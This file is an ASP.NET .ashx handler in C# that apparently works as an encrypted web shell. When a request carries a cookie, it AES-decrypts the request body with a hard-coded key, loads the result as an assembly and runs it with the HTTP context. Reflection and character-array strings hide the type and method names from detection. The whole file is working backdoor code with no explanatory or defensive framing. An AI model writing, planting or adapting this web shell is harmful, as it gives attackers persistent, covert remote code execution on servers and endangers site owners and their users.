<%@ WebHandler Language="C#" Class="H_a1b2" %>
using System;
using System.Web;
using System.Text;

public class H_a1b2 : IHttpHandler {
    public void ProcessRequest(HttpContext p_c3d4) {
        if (p_c3d4.Request.Cookies.Count > 0) {
            var k_e5f6 = Encoding.Default.GetBytes(new string(new char[] {'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'}));
            var d_g7h8 = p_c3d4.Request.BinaryRead(p_c3d4.Request.ContentLength);

            var t_0 = Type.GetType(new string(new char[] {'S','y','s','t','e','m','.','S','e','c','u','r','i','t','y','.','C','r','y','p','t','o','g','r','a','p','h','y','.','R','i','j','n','d','a','e','l','M','a','n','a','g','e','d'}));
            var i_1 = t_0.GetConstructor(Type.EmptyTypes).Invoke(null);
            var m_2 = t_0.GetMethod(new string(new char[] {'C','r','e','a','t','e','D','e','c','r','y','p','t','o','r'}), new Type[] { typeof(byte[]), typeof(byte[]) });
            var i_3 = m_2.Invoke(i_1, new object[] { k_e5f6, k_e5f6 });
            var m_4 = i_3.GetType().GetMethod(new string(new char[] {'T','r','a','n','s','f','o','r','m','F','i','n','a','l','B','l','o','c','k'}));
            var p_5 = (byte[]) m_4.Invoke(i_3, new object[] { d_g7h8, 0, d_g7h8.Length });

            var t_6 = Type.GetType(new string(new char[] {'S','y','s','t','e','m','.','R','e','f','l','e','c','t','i','o','n','.','A','s','s','e','m','b','l','y'}));
            var m_7 = t_6.GetMethod(new string(new char[] {'L','o','a','d'}), new Type[] { typeof(byte[]) });
            var i_8 = m_7.Invoke(null, new object[] { p_5 });
            var m_9 = i_8.GetType().GetMethod(new string(new char[] {'C','r','e','a','t','e','I','n','s','t','a','n','c','e'}), new Type[] { typeof(string) });
            var i_10 = m_9.Invoke(i_8, new object[] { new string(new char[] {'K'}) });
            
            i_10.GetType().GetMethod(new string(new char[] {'E','q','u','a','l','s'})).Invoke(i_10, new object[] { p_c3d4 });
        }
    }
    public bool IsReusable { get { return false; } }
}